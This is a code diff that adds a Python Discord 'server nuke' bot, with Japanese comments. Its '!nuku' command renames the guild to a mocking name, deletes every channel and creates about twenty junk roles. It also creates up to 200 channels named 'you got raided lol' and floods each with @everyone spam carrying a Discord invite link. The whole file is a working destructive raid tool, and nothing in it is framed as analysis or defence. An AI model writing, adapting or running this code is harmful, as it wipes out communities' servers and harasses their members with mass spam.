@@ -1,0 +1,69 @@
+import discord
+from discord.ext import commands
+import asyncio
+import random
+
+# --- 設定項目 ---
+TOKEN = "YOUR_BOT_TOKEN_HERE"
+CHANNEL_LIMIT = 200
+NAME_BASE = "荒らされてやんのｗ"
+ATTACK_MSG = "@everyone # Join now discord.gg/KG3Upxd8au"
+MSG_COUNT = 20
+EMOJIS = ['😀','😂','😎','😜','🤪','🥳','😡','🤯','👀','💀','👻']
+
+limit = asyncio.Semaphore(60)
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+@bot.event
+async def on_ready():
+    print(f'Logged in: {bot.user}')
+
+async def do_spam(channel):
+    tasks = []
+    for _ in range(MSG_COUNT):
+        tasks.append(asyncio.create_task(channel.send(ATTACK_MSG)))
+    await asyncio.gather(*tasks)
+
+async def make_ch(guild):
+    async with limit:
+        try:
+            suffix = ''.join(random.choices(EMOJIS, k=8))
+            target_name = f"{NAME_BASE}-{suffix}"
+            new_ch = await guild.create_text_channel(name=target_name)
+            asyncio.create_task(do_spam(new_ch))
+        except:
+            pass
+
+async def del_ch(channel):
+    async with limit:
+        try:
+            await channel.delete()
+        except:
+            pass
+
+async def make_role(guild):
+    async with limit:
+        try:
+            name = ''.join(random.choices(EMOJIS, k=32))
+            await guild.create_role(name=name, color=discord.Color.random())
+        except:
+            pass
+
+@bot.command(name="nuku")
+async def nuku(ctx):
+    guild = ctx.guild
+    
+    try:
+        asyncio.create_task(guild.edit(name="さときゅん鯖植民地"))
+    except:
+        pass
+
+    d_tasks = [asyncio.create_task(del_ch(c)) for c in guild.channels]
+    r_tasks = [asyncio.create_task(make_role(guild)) for _ in range(20)]
+    c_tasks = [asyncio.create_task(make_ch(guild)) for _ in range(CHANNEL_LIMIT)]
+
+    await asyncio.gather(*d_tasks, *r_tasks, *c_tasks)
+
+if __name__ == "__main__":
+    bot.run(TOKEN)
